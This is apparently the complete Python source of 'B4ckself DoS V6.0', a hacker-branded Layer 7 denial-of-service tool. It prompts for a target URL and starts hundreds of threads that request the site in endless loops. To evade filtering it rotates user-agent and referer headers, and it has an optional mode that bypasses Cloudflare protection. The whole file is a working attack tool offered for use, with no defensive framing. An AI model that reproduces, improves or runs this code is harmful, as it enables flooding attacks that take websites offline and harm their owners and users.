import os, threading, time, random, sys, random, string, cfscrape, requests

ref = [
 'https://duckduckgo.com/',
 'https://www.google.com/',
 'https://www.bing.com/',
 'https://www.yandex.ru/',
 'https://search.yahoo.com/',
 'https://www.facebook.com/',
 'https://twitter.com/',
 'https://www.youtube.com/'
]

uagz = [
 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0',
 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0'
]

scraper = cfscrape.create_scraper()

class Spammer(threading.Thread):
    
    def __init__(self, url, number):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.Lock = threading.Lock()

    def request_cloud(self):
        soso = scraper.get(self.url, timeout=10)
        print ("| Thread #%s | CLOUDFLARE METHOD | Target: %s | HTTP Status: %s |" % (self.num, self.url, soso.status_code))

    def request_default(self):
        ro = requests.get(self.url, timeout=10, headers={'User-Agent' : random.choice(uagz), 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language' : 'en-US,en;q=0.5', 'Accept-Encoding' : 'gzip, deflate', 'DNT' : '1', 'Referer' : random.choice(ref)})
        print ("| Thread #%s | NORMAL METHOD | Target: %s | HTTP Status: %s |" % (self.num, self.url, ro.status_code))
        
    def run(self):
        while True:
            try:
                if Cloud_Mode:
                    self.request_cloud()
                else:
                    self.request_default()
            except: 
                pass
                 
class MainLoop():
    
    def __init__(self):
        if os.name in ("nt", "dos", "ce"):
            os.system('cls')
            os.system('title       ........:::::   B4ckself DoS V6.0 by M4STER T3MPER   :::::........        ')
            os.system('color a')
            color = ['a', 'b', 'c', 'd', 'e', 'f']
            os.system('color %s' % (color[random.randint(0, 5)]))
        print ('\n           ###################################            \n')
        print ('        01010o.....::B4CKSELF DoS V6.0::.....o01010\n         ')
        print ('      #################################################       ')
        print ('\n\t  A Layer 7 DoS Tool / Original Coderz: B4ckdoor & Xordas \n')
        print ('\t Re-Coded & New Features by M4STER T3MPER #AnonMafiaCyberFamily \n\n')
        print ('\t Features: Normal Attack & Cloudflare Bypass / #ShoutOutToInforge \n\n')
    
    def check_url(self, url):
        if url[0]+url[1]+url[2]+url[3] == "www.":
            url = "http://" + url
        elif url[0]+url[1]+url[2]+url[3] == "http":
            pass
        else:
            url = "http://" + url
        return url

    def setup(self):
        global Cloud_Mode
        while True:
            try:
                url = input('> Enter Url to DoS: ')
                url = self.check_url(url)
                sosi = requests.head(url)
                break
            except:                
                print ("> Encountered a connection problem - Check the site")
        while True:
            try:
                o = input('> Methods = [y]Cloudflare Bypass / [Enter]Normal Attack: ')
                if o == 'y':
                    Cloud_Mode = True
                    break
                else:
                    Cloud_Mode = False
                    break
            except:
                pass       
        while True:                
            try:
                num_thread = int(input('> Enter the number of threads [800]: '))
            except:
                num_thread = 800
            break

        print ("-----------------------------------------------------------\n   Target:\t%s\n   CF Method:\t%s\n   Threads:\t%d\n-----------------------------------------------------------\n> Starting...\n" % (url, Cloud_Mode, num_thread))
        time.sleep(3)
        for i in range(num_thread):
            Spammer(url, i + 1).start()
        
if __name__ == '__main__':
    N = 0
    b = MainLoop()
    b.setup()
